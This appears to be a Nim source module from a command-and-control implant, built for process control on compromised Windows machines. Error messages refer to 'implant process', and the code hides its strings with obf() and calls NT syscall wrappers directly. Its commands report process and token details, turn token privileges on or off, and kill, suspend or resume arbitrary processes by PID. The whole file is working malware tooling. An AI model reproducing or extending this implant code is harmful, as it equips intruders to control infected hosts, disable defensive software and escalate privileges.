import std/json
import std/strutils
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/winapi/syscall
import execution/core
import ./tokens/utils as tokutils

const
  kvLabelW = 42
  modNameW = 28
  modBaseW = 20
  modSizeW = 14
  invalidHandle = cast[pointer](-1)
  th32CsSnapProcess = 0x00000002'u32
  th32CsSnapModule = 0x00000008'u32
  th32CsSnapModule32 = 0x00000010'u32
  procBasicInfo = 0'u32
  procIoCounters = 2'u32
  procVmCounters = 3'u32
  procTimes = 4'u32
  procBasePriority = 5'u32
  procDebugPort = 7'u32
  procWow64Info = 26'u32
  procImageFileName = 27'u32
  procBreakOnTermination = 29'u32
  procCommandLine = 60'u32
  procProtectionInfo = 61'u32
  statusInfoLengthMismatch = 0xC0000004'u32
  processQueryVmRead = 0x0410'u32
  processTerminate = 0x0001'u32
  processSuspendResume = 0x0800'u32
  tokenQuery = 0x0008'u32
  tokenAdjust = 0x0020'u32
  tokenPrivilegesClass = 3'u32
  sePrivilegeEnabled = 0x00000002'u32
  sePrivilegeDefault = 0x00000001'u32
  privNameWidth = 46
  pmcCb = 0
  pmcWorkingSet = 8
  pmcPagefileUsage = 32
  pmcPeakPagefile = 40
  pmcPeakWorkingSet = 16
  pmcPrivateUsage = 48
  pmcSize = 72

type
  FileTime = object
    dwLowDateTime: uint32
    dwHighDateTime: uint32

  ProcessEntry32W = object
    dwSize: uint32
    cntUsage: uint32
    th32ProcessID: uint32
    th32DefaultHeapID: uint64
    th32ModuleID: uint32
    cntThreads: uint32
    th32ParentProcessID: uint32
    pcPriClassBase: int32
    dwFlags: uint32
    szExeFile: array[260, uint16]

  ModuleEntry32W = object
    dwSize: uint32
    th32ModuleID: uint32
    th32ProcessID: uint32
    glblcntUsage: uint32
    proccntUsage: uint32
    modBaseAddr: pointer
    modBaseSize: uint32
    hModule: pointer
    szModule: array[256, uint16]
    szExePath: array[260, uint16]

  ProcessBasicInformation = object
    exitStatus: culong
    pebBaseAddress: pointer
    affinityMask: uint64
    basePriority: int32
    uniqueProcessId: uint64
    inheritedFromUniqueProcessId: uint64

  IoCounters = object
    readOperationCount: uint64
    writeOperationCount: uint64
    otherOperationCount: uint64
    readTransferCount: uint64
    writeTransferCount: uint64
    otherTransferCount: uint64

  VmCounters = object
    peakVirtualSize: uint64
    virtualSize: uint64
    pageFaultCount: uint32
    peakWorkingSetSize: uint64
    workingSetSize: uint64
    quotaPeakPagedPoolUsage: uint64
    quotaPagedPoolUsage: uint64
    quotaPeakNonPagedPoolUsage: uint64
    quotaNonPagedPoolUsage: uint64
    pagefileUsage: uint64
    peakPagefileUsage: uint64

  KernelUserTimes = object
    createTime: uint64
    exitTime: uint64
    kernelTime: uint64
    userTime: uint64

  Luid = object
    lowPart*, highPart*: culong

  LuidAttr = object
    luid: Luid
    attributes: culong

  TokenPrivileges = object
    count: culong
    privileges: array[1, LuidAttr]

  ProcInfoView = enum
    pvSummary
    pvModules
    pvPrivileges
    pvFull

proc appendSectionHdr(report: var string; title: string) =
  # Appends a section header to the report
  if report.len > 0:
    report.add '\n'
  report.add obf("[ ") & title & obf(" ]\n\n")

proc kv(label, value: string): string =
  # Builds a padded label and value line
  if label.len >= kvLabelW:
    label & "  " & value & "\n"
  else:
    label & (" ".repeat(kvLabelW - label.len)) & value & "\n"

proc colLeft(s: string; w: int): string =
  # Pads a string on the right to a fixed width
  if s.len >= w:
    s
  else:
    s & (" ".repeat(w - s.len))

proc formatModuleSizeKb(sizeBytes: uint32): string =
  # Formats a module size as kilobytes
  const bytesPerKb = 1024'u64
  if sizeBytes == 0:
    return obf("0 KB")
  let bytes = uint64(sizeBytes)
  let kb = bytes div bytesPerKb
  if kb == 0:
    return obf("<1 KB")
  return $kb & obf(" KB")

proc paramPid(params: string): uint32 =
  # Reads the pid value from the params json
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("pid")):
      return 0
    let n = p[obf("pid")]
    if n.kind == JInt:
      uint32(n.getInt())
    else:
      uint32(parseInt(n.getStr()))
  except Exception:
    0

proc procInfoView(args: string): ProcInfoView =
  # Parses the requested view from the args
  let rest = args.strip()
  if rest.len == 0:
    return pvSummary
  let token = rest.split(maxsplit = 1)[0].toLowerAscii()
  case token
  of obf("full"):
    pvFull
  of obf("modules"):
    pvModules
  of obf("privileges"):
    pvPrivileges
  else:
    pvSummary

proc fileTimeToStr(ft: FileTime): string =
  # Converts a file time into a readable string
  var st: array[16, byte]
  if fileTimeToSystemTime(addr ft, addr st[0]) == 0:
    return obf("-")
  let y = cast[ptr uint16](addr st[0])[]
  let mo = cast[ptr uint16](addr st[2])[]
  let d = cast[ptr uint16](addr st[4])[]
  let h = cast[ptr uint16](addr st[6])[]
  let mi = cast[ptr uint16](addr st[8])[]
  let s = cast[ptr uint16](addr st[10])[]
  $y & obf("-") & $mo & obf("-") & $d & obf(" ") & $h & obf(":") & $mi & obf(":") & $s

proc fileTimeU64(ft: FileTime): uint64 =
  # Converts a file time into a 64 bit number
  (uint64(ft.dwHighDateTime) shl 32) or uint64(ft.dwLowDateTime)

proc priorityClassName(cls: culong): string =
  # Returns the name for a priority class value
  case cls
  of 0x00000040'u32: obf("IDLE")
  of 0x00000020'u32: obf("NORMAL")
  of 0x00000080'u32: obf("HIGH")
  of 0x00000100'u32: obf("REALTIME")
  of 0x00004000'u32: obf("BELOW_NORMAL")
  of 0x00008000'u32: obf("ABOVE_NORMAL")
  else: obf("0x") & toHex(cls)

proc ntQueryBuffer(procH: pointer; cls: culong; minSz: int): seq[byte] =
  # Queries process information into a byte buffer
  var sz = culong(minSz)
  for _ in 0 ..< 8:
    var data = newSeq[byte](int(sz))
    var retLen: culong = 0
    let st = queryInformationProcess(procH, cls, addr data[0], sz, addr retLen)
    if st == 0:
      if int(retLen) > 0 and int(retLen) < data.len:
        data.setLen(int(retLen))
      return data
    if st != statusInfoLengthMismatch:
      return @[]
    if retLen > sz:
      sz = retLen
    else:
      sz = sz * 2
  @[]

proc ntQueryUnicodeInBuffer(data: seq[byte]): string =
  # Reads a wide string out of a query buffer
  if data.len < 8:
    return ""
  let length = cast[ptr uint16](addr data[0])[]
  if length == 0:
    return ""
  if data.len >= 16 + int(length):
    return wideToAscii(cast[pointer](addr data[16]), culong(length))
  let buf = cast[ptr pointer](addr data[4])[]
  if buf != nil:
    return wideToAscii(buf, culong(length))
  ""

proc appendSummary(report: var string; procH: pointer; pid, tid: culong; isSelf: bool) =
  # Appends the process summary section to the report
  report.add kv(obf("PID:"), $pid)
  report.add kv(obf("User:"), tokutils.tokenUserFromProcess(procH))
  if isSelf:
    report.add kv(obf("Main thread ID:"), $tid)
  else:
    report.add kv(obf("Main thread ID:"), obf("-"))

  if isSelf:
    var modPath: array[1024, uint16]
    let modLen = getModuleFileNameW(nil, addr modPath[0], culong(modPath.len))
    if modLen > 0:
      report.add kv(obf("Image (GetModuleFileNameW):"), wideToAscii(addr modPath[0], culong(modLen * 2)))

  var imgBuf: array[2048, uint16]
  var imgLen = culong(imgBuf.len)
  if queryFullProcessImageNameW(procH, 0, addr imgBuf[0], addr imgLen) != 0 and imgLen > 0:
    report.add kv(obf("Image (QueryFullProcessImageNameW):"), wideToAscii(addr imgBuf[0], culong(imgLen * 2)))

  let imgNt = ntQueryUnicodeInBuffer(ntQueryBuffer(procH, procImageFileName, 512))
  if imgNt.len > 0:
    report.add kv(obf("Image (NtQuery ProcessImageFileName):"), imgNt)

  let cmdLine = ntQueryUnicodeInBuffer(ntQueryBuffer(procH, procCommandLine, 1024))
  if cmdLine.len > 0:
    report.add kv(obf("Command line:"), cmdLine)

  let hSnap = createToolhelp32Snapshot(th32CsSnapProcess, 0)
  if hSnap != invalidHandle:
    defer: discard closeHandle(hSnap)
    var pe: ProcessEntry32W
    pe.dwSize = uint32(sizeof(ProcessEntry32W))
    if process32FirstW(hSnap, addr pe) != 0:
      var found = false
      while true:
        if pe.th32ProcessID == uint32(pid):
          report.add kv(obf("Name (toolhelp):"), wideToAscii(addr pe.szExeFile[0], culong(sizeof(pe.szExeFile))))
          report.add kv(obf("Parent PID:"), $pe.th32ParentProcessID)
          report.add kv(obf("Thread count:"), $pe.cntThreads)
          report.add kv(obf("Base priority (toolhelp):"), $pe.pcPriClassBase)
          found = true
          break
        if process32NextW(hSnap, addr pe) == 0:
          break
      if not found:
        report.add obf("Toolhelp process entry: not found\n")

  let pri = getPriorityClass(procH)
  if pri != 0:
    report.add kv(obf("Priority class:"), priorityClassName(pri) & obf(" (0x") & toHex(pri) & ")")

  var handleCount: culong = 0
  if getProcessHandleCount(procH, addr handleCount) != 0:
    report.add kv(obf("Handle count:"), $handleCount)

  var wow: culong = 0
  if isWow64Process(procH, addr wow) != 0:
    let wowStr = if wow != 0: obf("yes (32-bit on 64-bit)") else: obf("no (native)")
    report.add kv(obf("WOW64:"), wowStr)

proc appendFullDetails(report: var string; procH: pointer) =
  # Appends the full process detail sections to the report
  let wowBuf = ntQueryBuffer(procH, procWow64Info, 16)
  if wowBuf.len >= 8:
    let wowPtr = cast[ptr pointer](addr wowBuf[0])[]
    appendSectionHdr(report, obf("WOW64 details"))
    report.add kv(obf("WOW64 PEB (NtQuery):"), if wowPtr != nil: $cast[uint](wowPtr) else: obf("null"))

  let basicBuf = ntQueryBuffer(procH, procBasicInfo, sizeof(ProcessBasicInformation).int)
  if basicBuf.len >= sizeof(ProcessBasicInformation).int:
    let bi = cast[ptr ProcessBasicInformation](addr basicBuf[0])
    appendSectionHdr(report, obf("Process basic information"))
    report.add kv(obf("Exit status:"), obf("0x") & toHex(bi.exitStatus))
    report.add kv(obf("PEB:"), $cast[uint](bi.pebBaseAddress))
    report.add kv(obf("Affinity mask:"), obf("0x") & toHex(bi.affinityMask))
    report.add kv(obf("Base priority:"), $bi.basePriority)
    report.add kv(obf("Unique process ID:"), $bi.uniqueProcessId)
    report.add kv(obf("Inherited from (PPID):"), $bi.inheritedFromUniqueProcessId)

  let ioBuf = ntQueryBuffer(procH, procIoCounters, sizeof(IoCounters).int)
  if ioBuf.len >= sizeof(IoCounters).int:
    let io = cast[ptr IoCounters](addr ioBuf[0])
    appendSectionHdr(report, obf("I/O counters"))
    report.add kv(obf("Read ops:"), $io.readOperationCount & obf("  bytes: ") & $io.readTransferCount)
    report.add kv(obf("Write ops:"), $io.writeOperationCount & obf("  bytes: ") & $io.writeTransferCount)
    report.add kv(obf("Other ops:"), $io.otherOperationCount & obf("  bytes: ") & $io.otherTransferCount)

  let vmBuf = ntQueryBuffer(procH, procVmCounters, sizeof(VmCounters).int)
  if vmBuf.len >= sizeof(VmCounters).int:
    let vm = cast[ptr VmCounters](addr vmBuf[0])
    appendSectionHdr(report, obf("VM counters"))
    report.add kv(obf("Page faults:"), $vm.pageFaultCount)
    report.add kv(obf("Peak virtual (KB):"), $(vm.peakVirtualSize div 1024))
    report.add kv(obf("Virtual (KB):"), $(vm.virtualSize div 1024))
    report.add kv(obf("Peak working set (KB):"), $(vm.peakWorkingSetSize div 1024))
    report.add kv(obf("Working set (KB):"), $(vm.workingSetSize div 1024))
    report.add kv(obf("Peak pagefile (KB):"), $(vm.peakPagefileUsage div 1024))
    report.add kv(obf("Pagefile (KB):"), $(vm.pagefileUsage div 1024))

  var memBuf: array[pmcSize, byte]
  cast[ptr uint32](addr memBuf[pmcCb])[] = uint32(pmcSize)
  if k32GetProcessMemoryInfo(procH, addr memBuf[0], culong(pmcSize)) != 0:
    appendSectionHdr(report, obf("Process memory"))
    let ws = cast[ptr uint](addr memBuf[pmcWorkingSet])[]
    let pws = cast[ptr uint](addr memBuf[pmcPeakWorkingSet])[]
    let pf = cast[ptr uint](addr memBuf[pmcPagefileUsage])[]
    let ppf = cast[ptr uint](addr memBuf[pmcPeakPagefile])[]
    let priv = cast[ptr uint](addr memBuf[pmcPrivateUsage])[]
    report.add kv(obf("Working set (KB):"), $(ws div 1024))
    report.add kv(obf("Peak working set (KB):"), $(pws div 1024))
    report.add kv(obf("Pagefile (KB):"), $(pf div 1024))
    report.add kv(obf("Peak pagefile (KB):"), $(ppf div 1024))
    report.add kv(obf("Private usage (KB):"), $(priv div 1024))

  var ct, et, kt, ut: FileTime
  if getProcessTimes(procH, addr ct, addr et, addr kt, addr ut) != 0:
    appendSectionHdr(report, obf("Process times"))
    report.add kv(obf("Created:"), fileTimeToStr(ct))
    report.add kv(obf("Kernel:"), $fileTimeU64(kt) & obf(" (100ns units)"))
    report.add kv(obf("User:"), $fileTimeU64(ut) & obf(" (100ns units)"))

  let ktBuf = ntQueryBuffer(procH, procTimes, sizeof(KernelUserTimes).int)
  if ktBuf.len >= sizeof(KernelUserTimes).int:
    let kt2 = cast[ptr KernelUserTimes](addr ktBuf[0])
    appendSectionHdr(report, obf("NT process times"))
    report.add kv(obf("Create (FILETIME u64):"), $kt2.createTime)
    report.add kv(obf("Kernel (100ns):"), $kt2.kernelTime)
    report.add kv(obf("User (100ns):"), $kt2.userTime)

  var misc = ""
  var basePri: int32 = 0
  var bpLen: culong = culong(sizeof(basePri))
  if queryInformationProcess(procH, procBasePriority, addr basePri, bpLen, nil) == 0:
    misc.add kv(obf("Nt base priority:"), $basePri)

  var debugPort: uint64 = 0
  var dpLen: culong = culong(sizeof(debugPort))
  if queryInformationProcess(procH, procDebugPort, addr debugPort, dpLen, nil) == 0:
    misc.add kv(obf("Debug port:"), if debugPort != 0: $debugPort else: obf("none"))

  var breakTerm: culong = 0
  var btLen: culong = culong(sizeof(breakTerm))
  if queryInformationProcess(procH, procBreakOnTermination, addr breakTerm, btLen, nil) == 0:
    misc.add kv(obf("Break on termination:"), if breakTerm != 0: obf("yes") else: obf("no"))

  let protBuf = ntQueryBuffer(procH, procProtectionInfo, 8)
  if protBuf.len > 0:
    misc.add kv(obf("Protection level byte:"), obf("0x") & toHex(protBuf[0]))

  if misc.len > 0:
    appendSectionHdr(report, obf("Miscellaneous"))
    report.add misc

  appendSectionHdr(report, obf("System reference"))
  report.add kv(obf("Uptime reference (GetTickCount64 ms):"), $getTickCount64())

proc queryTokenBuf(token: pointer; cls: culong): seq[byte] =
  # Queries token information into a byte buffer
  var need: culong = 0
  discard queryInformationToken(token, cls, nil, 0, addr need)
  if need == 0:
    return @[]
  result = newSeq[byte](need.int)
  var st = queryInformationToken(token, cls, addr result[0], need, addr need)
  if st == statusInfoLengthMismatch or need > culong(result.len):
    result = newSeq[byte](need.int)
    st = queryInformationToken(token, cls, addr result[0], need, addr need)
  if st != 0:
    return @[]

const tokenPrivHdrSize = 4
const tokenPrivEntrySize = 12 # LUID (8) + Attributes (DWORD)

proc tokenPrivilegeCount(buf: seq[byte]): int =
  # Returns how many privileges are in the token buffer
  if buf.len < tokenPrivHdrSize:
    return 0
  int(cast[ptr uint32](addr buf[0])[])

proc readTokenPrivilegeEntry(buf: seq[byte]; index: int): (Luid, uint32) =
  # Reads one privilege entry from the token buffer
  let off = tokenPrivHdrSize + index * tokenPrivEntrySize
  var luid: Luid
  luid.lowPart = cast[culong](cast[ptr uint32](addr buf[off])[])
  luid.highPart = cast[culong](cast[ptr uint32](addr buf[off + 4])[])
  let attrs = cast[ptr uint32](addr buf[off + 8])[]
  (luid, attrs)

proc privilegeAttrsInToken(buf: seq[byte]; target: Luid): int =
  # Finds the attributes for a privilege in the token buffer
  let n = tokenPrivilegeCount(buf)
  for i in 0 ..< n:
    if tokenPrivHdrSize + (i + 1) * tokenPrivEntrySize > buf.len:
      break
    let (luid, attrs) = readTokenPrivilegeEntry(buf, i)
    if luid.lowPart == target.lowPart and luid.highPart == target.highPart:
      return int(attrs)
  -1

proc knownPrivilegeNames(): seq[string] =
  # Returns the list of known privilege names
  @[
    obf("SeAssignPrimaryTokenPrivilege"),
    obf("SeAuditPrivilege"),
    obf("SeBackupPrivilege"),
    obf("SeChangeNotifyPrivilege"),
    obf("SeCreateGlobalPrivilege"),
    obf("SeCreatePagefilePrivilege"),
    obf("SeCreatePermanentPrivilege"),
    obf("SeCreateSymbolicLinkPrivilege"),
    obf("SeCreateTokenPrivilege"),
    obf("SeDebugPrivilege"),
    obf("SeDelegateSessionUserImpersonatePrivilege"),
    obf("SeEnableDelegationPrivilege"),
    obf("SeImpersonatePrivilege"),
    obf("SeIncreaseBasePriorityPrivilege"),
    obf("SeIncreaseQuotaPrivilege"),
    obf("SeIncreaseWorkingSetPrivilege"),
    obf("SeLoadDriverPrivilege"),
    obf("SeLockMemoryPrivilege"),
    obf("SeMachineAccountPrivilege"),
    obf("SeManageVolumePrivilege"),
    obf("SeProfileSingleProcessPrivilege"),
    obf("SeRelabelPrivilege"),
    obf("SeRemoteShutdownPrivilege"),
    obf("SeRestorePrivilege"),
    obf("SeSecurityPrivilege"),
    obf("SeShutdownPrivilege"),
    obf("SeSyncAgentPrivilege"),
    obf("SeSystemEnvironmentPrivilege"),
    obf("SeSystemProfilePrivilege"),
    obf("SeSystemtimePrivilege"),
    obf("SeTakeOwnershipPrivilege"),
    obf("SeTcbPrivilege"),
    obf("SeTimeZonePrivilege"),
    obf("SeTrustedCredManAccessPrivilege"),
    obf("SeUndockPrivilege"),
  ]

proc appendPrivilegeLine(report: var string; mark, name, status: string) =
  # Appends one formatted privilege line to the report
  var line = mark & name
  while line.len < privNameWidth:
    line.add ' '
  line &= obf("[") & status & obf("]\n")
  report.add line

proc privilegeStatusFromAttrs(attrs: int): (string, string) =
  # Returns the mark and status text for privilege attributes
  if attrs < 0:
    return (obf("[ ] "), obf("Absent"))
  let a = culong(attrs)
  if (a and sePrivilegeEnabled) != 0:
    return (obf("[+] "), obf("Enabled"))
  if (a and sePrivilegeDefault) != 0:
    return (obf("[*] "), obf("Default"))
  (obf("[-] "), obf("Disabled"))

proc formatPrivilegeList(accessToken: pointer): string =
  # Builds the privilege list text for an access token
  let buf = queryTokenBuf(accessToken, tokenPrivilegesClass)
  var nameW: array[128, uint16]
  var nameBuf: array[256, char]
  var listed: seq[string] = @[]
  for privName in knownPrivilegeNames():
    if privName in listed:
      continue
    listed.add privName
    asciiWide(privName, nameW)
    var luid: Luid
    if lookupPrivilegeValueW(nil, addr nameW[0], addr luid) == 0:
      continue
    let attrs = privilegeAttrsInToken(buf, luid)
    let (mark, status) = privilegeStatusFromAttrs(attrs)
    appendPrivilegeLine(result, mark, privName, status)
  if buf.len > 0:
    let n = tokenPrivilegeCount(buf)
    for i in 0 ..< n:
      if tokenPrivHdrSize + (i + 1) * tokenPrivEntrySize > buf.len:
        break
      let (luid, attrs) = readTokenPrivilegeEntry(buf, i)
      var nameLen: culong = 256
      if lookupPrivilegeNameW(nil, addr luid, addr nameW[0], addr nameLen) == 0:
        continue
      let nl = wtoa(nameW, nameBuf)
      if nl == 0:
        continue
      var extra = newString(nl)
      copyMem(addr extra[0], addr nameBuf[0], nl)
      if extra in listed:
        continue
      listed.add extra
      let (mark, status) = privilegeStatusFromAttrs(int(attrs))
      appendPrivilegeLine(result, mark, extra, status)

proc appendPrivilegeView(report: var string; procH: pointer) =
  # Appends the privileges section to the report
  appendSectionHdr(report, obf("Privileges"))
  var accessToken: pointer
  let stTok = openProcessToken(procH, tokenQuery, addr accessToken)
  if stTok != 0:
    report.add errorText(obf("NtOpenProcessToken failed"), stTok) & "\n"
    return
  defer:
    discard ntCloseHandle(accessToken)
  report.add formatPrivilegeList(accessToken)

proc appendModules(report: var string; pid: culong) =
  # Appends the loaded modules section to the report
  appendSectionHdr(report, obf("Loaded modules"))
  let hSnap = createToolhelp32Snapshot(th32CsSnapModule or th32CsSnapModule32, pid)
  if hSnap == invalidHandle:
    report.add obf("Module snapshot failed (") & $getLastError() & ")\n"
    return
  defer: discard closeHandle(hSnap)
  var me: ModuleEntry32W
  me.dwSize = uint32(sizeof(ModuleEntry32W))
  if module32FirstW(hSnap, addr me) == 0:
    report.add obf("Module32FirstW failed (") & $getLastError() & ")\n"
    return
  report.add colLeft(obf("module"), modNameW) & colLeft(obf("base"), modBaseW) &
    colLeft(obf("size"), modSizeW) & obf("path") & "\n"
  while true:
    if me.th32ProcessID == uint32(pid):
      let name = wideToAscii(addr me.szModule[0], culong(sizeof(me.szModule)))
      let path = wideToAscii(addr me.szExePath[0], culong(sizeof(me.szExePath)))
      let baseStr = obf("0x") & toHex(cast[uint](me.modBaseAddr))
      let sizeStr = formatModuleSizeKb(me.modBaseSize)
      report.add colLeft(name, modNameW) & colLeft(baseStr, modBaseW) &
        colLeft(sizeStr, modSizeW) & path & "\n"
    if module32NextW(hSnap, addr me) == 0:
      break

proc run_proc_info*(args, params: string; buf: var openArray[char]): int =
  # Main function that collects process info and writes the report
  let selfPid = getCurrentProcessId().uint32
  var targetPid = paramPid(params)
  if targetPid == 0:
    targetPid = selfPid

  var stOpen: culong = 0
  let procH = openProcess(culong(targetPid), processQueryVmRead, addr stOpen)
  if procH == nil:
    return writeErr(obf("NtOpenProcess failed"), buf, stOpen)
  defer:
    discard ntCloseHandle(procH)

  let tid = if targetPid == selfPid: getCurrentThreadId() else: culong(0)
  let isSelf = targetPid == selfPid
  let view = procInfoView(args)
  var report = ""
  case view
  of pvSummary:
    appendSummary(report, procH, culong(targetPid), tid, isSelf)
  of pvModules:
    appendModules(report, culong(targetPid))
  of pvPrivileges:
    appendPrivilegeView(report, procH)
  of pvFull:
    appendSummary(report, procH, culong(targetPid), tid, isSelf)
    appendPrivilegeView(report, procH)
    appendFullDetails(report, procH)
    appendModules(report, culong(targetPid))
  writeMsg(report, buf)

proc paramStr(params, key: string): string =
  # Reads a string field from the params json
  try:
    let p = parseJson(params)
    if p.hasKey(key):
      p[key].getStr().strip(chars = {'"', '\''})
    else:
      ""
  except Exception:
    ""

proc privilegeHeld(token: pointer; name: string): bool =
  # Checks that the token holds the named privilege
  let buf = queryTokenBuf(token, tokenPrivilegesClass)
  if buf.len == 0:
    return false
  var nameW: array[128, uint16]
  asciiWide(name, nameW)
  var target: Luid
  if lookupPrivilegeValueW(nil, addr nameW[0], addr target) == 0:
    return false
  let n = tokenPrivilegeCount(buf)
  for i in 0 ..< n:
    if tokenPrivHdrSize + (i + 1) * tokenPrivEntrySize > buf.len:
      break
    let (luid, _) = readTokenPrivilegeEntry(buf, i)
    if luid.lowPart == target.lowPart and luid.highPart == target.highPart:
      return true
  false

proc setProcessPrivilege(procH: pointer; privName: string; enable: bool): string =
  # Enables or disables a named privilege on the process token
  if privName.len == 0:
    return errorText(obf("missing privilege name"))
  var token: pointer
  if openProcessToken(procH, tokenQuery or tokenAdjust, addr token) != 0:
    return errorText(obf("NtOpenProcessToken failed"))
  defer:
    discard ntCloseHandle(token)
  if not privilegeHeld(token, privName):
    return errorText(obf("privilege not present for this process - ") & privName)
  var nameW: array[128, uint16]
  asciiWide(privName, nameW)
  var luid: Luid
  if lookupPrivilegeValueW(nil, addr nameW[0], addr luid) == 0:
    return errorText(obf("LookupPrivilegeValue failed"))
  var tp: TokenPrivileges
  tp.count = 1
  tp.privileges[0].luid = luid
  tp.privileges[0].attributes = if enable: sePrivilegeEnabled else: 0
  if adjustPrivilegesToken(token, 0, addr tp, culong sizeof(tp), nil, nil) != 0:
    return errorText(obf("NtAdjustPrivilegesToken failed"))
  privName & obf(" -> ") & (if enable: obf("on") else: obf("off"))

proc run_proc_privileges*(params: string; buf: var openArray[char]): int =
  # Main function that turns a process privilege on or off
  let privName = paramStr(params, obf("name"))
  let statusRaw = paramStr(params, obf("status")).toLowerAscii()
  if privName.len == 0:
    return writeErr(obf("proc privileges requires --name"), buf)
  let enable =
    if statusRaw in [obf("on"), obf("enable"), obf("enabled"), obf("1"), obf("true")]: true
    elif statusRaw in [obf("off"), obf("disable"), obf("disabled"), obf("0"), obf("false")]: false
    else:
      return writeErr(obf("-st must be on or off"), buf)

  writeMsg(setProcessPrivilege(currentProcess, privName, enable), buf)

proc run_proc_kill*(params: string; buf: var openArray[char]): int =
  # Main function that terminates a target process
  let selfPid = getCurrentProcessId().uint32
  let targetPid = paramPid(params)
  if targetPid == 0:
    return writeErr(obf("proc kill requires --pid"), buf)
  if targetPid == selfPid:
    return writeErr(obf("cannot kill implant process"), buf)

  var stOpen: culong = 0
  let procH = openProcess(culong(targetPid), processTerminate, addr stOpen)
  if procH == nil:
    return writeErr(obf("NtOpenProcess failed"), buf, stOpen)
  defer:
    discard ntCloseHandle(procH)

  let stTerm = terminateProcess(procH)
  if stTerm != 0:
    return writeErr(obf("NtTerminateProcess failed"), buf, stTerm)
  writeMsg(obf("Process terminated (PID ") & $targetPid & obf(")."), buf)

proc run_proc_suspend_resume*(params: string; suspend: bool; buf: var openArray[char]): int =
  # Suspends or resumes a target process
  let selfPid = getCurrentProcessId().uint32
  let targetPid = paramPid(params)
  if targetPid == 0:
    let verb = if suspend: obf("suspend") else: obf("resume")
    return writeErr(obf("proc ") & verb & obf(" requires --pid"), buf)
  if targetPid == selfPid:
    return writeErr(obf("cannot suspend or resume implant process"), buf)

  var stOpen: culong = 0
  let procH = openProcess(culong(targetPid), processSuspendResume, addr stOpen)
  if procH == nil:
    return writeErr(obf("NtOpenProcess failed"), buf, stOpen)
  defer:
    discard ntCloseHandle(procH)

  let st = if suspend: suspendProcess(procH) else: resumeProcess(procH)
  if st != 0:
    let verb = if suspend: obf("NtSuspendProcess") else: obf("NtResumeProcess")
    return writeErr(verb & obf(" failed"), buf, st)

  if suspend:
    writeMsg(obf("Process suspended (PID ") & $targetPid & obf(")."), buf)
  else:
    writeMsg(obf("Process resumed (PID ") & $targetPid & obf(")."), buf)

proc run_proc_suspend*(params: string; buf: var openArray[char]): int =
  # Main function that suspends a target process
  run_proc_suspend_resume(params, true, buf)

proc run_proc_resume*(params: string; buf: var openArray[char]): int =
  # Main function that resumes a target process
  run_proc_suspend_resume(params, false, buf)
